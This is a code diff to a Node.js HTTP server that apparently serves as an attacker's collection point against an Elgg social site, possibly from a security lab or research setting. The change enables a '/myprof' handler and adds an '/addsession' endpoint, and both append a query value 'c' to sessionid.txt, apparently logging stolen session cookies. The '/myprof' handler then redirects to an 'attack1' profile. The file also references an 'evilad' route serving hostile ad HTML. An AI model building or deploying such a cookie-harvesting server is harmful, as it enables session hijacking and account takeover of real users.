@@ -81,20 +81,36 @@ http.createServer(function (req, res) {
             
 
             break;
-    	case "/myprof":    		
+    	case "/myprof":             
   			var getdata = qs.parse(urlObj.query);
             var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
-         /*   log.write(new Date().getTime()+"::"+getdata.c+"~");
-            var refUrl = url.parse(req.headers.referer);
+           log.write(new Date().getTime()+"::"+getdata.c+"~");
+            /*var refUrl = url.parse(req.headers.referer);
             if(!refUrl){
                 var hostname = elggsite;
             }else{
                 var hostname = refUrl.hostname+"/elgg";
             }*/
             
-    		res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/attack1'});
+    	    res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/attack1'});
+            //res.writeHead(200);
     		res.end();
     		break;
+        case "/addsession":             
+            var getdata = qs.parse(urlObj.query);
+            var log = fs.createWriteStream('sessionid.txt', {'flags': 'a'});    
+            log.write(new Date().getTime()+"::"+getdata.c+"~");
+            /*var refUrl = url.parse(req.headers.referer);
+            if(!refUrl){
+                var hostname = elggsite;
+            }else{
+                var hostname = refUrl.hostname+"/elgg";
+            }*/
+            
+            //res.writeHead(302,{Location: 'http://'+elggsite+'/pg/profile/attack1'});
+            res.writeHead(200);
+            res.end();
+            break;
 		case "/evilad":
 				var html = getEvilAdHtmlCode();
                     
